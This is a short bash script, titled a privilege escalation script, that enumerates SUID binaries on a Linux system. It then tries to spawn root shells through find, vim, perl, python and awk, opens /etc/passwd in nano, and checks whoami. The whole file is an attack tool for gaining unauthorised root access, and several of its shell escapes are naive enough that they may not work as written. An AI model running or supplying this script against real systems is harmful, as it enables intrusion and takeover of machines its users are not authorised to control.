#!/bin/bash
# Comprehensive privilege escalation script

echo "[*] Checking for SUID binaries..."
find / -perm -4000 -type f 2>/dev/null

echo "[*] Attempting to use 'find' with SUID..."
/usr/bin/find / -exec /bin/sh \; 2>/dev/null

echo "[*] Attempting to use 'vim' with SUID..."
/usr/bin/vim -c ':!/bin/sh' 2>/dev/null

echo "[*] Attempting to use 'nano' with SUID..."
/usr/bin/nano --version; /usr/bin/nano /etc/passwd 2>/dev/null

echo "[*] Attempting to use 'perl' with SUID..."
/usr/bin/perl -e 'exec "/bin/sh";' 2>/dev/null

echo "[*] Attempting to use 'python' with SUID..."
/usr/bin/python -c 'import os; os.system("/bin/sh")' 2>/dev/null

echo "[*] Attempting to use 'awk' with SUID..."
/usr/bin/awk 'BEGIN {system("/bin/sh")}' 2>/dev/null

echo "[*] Checking if user is root..."
whoami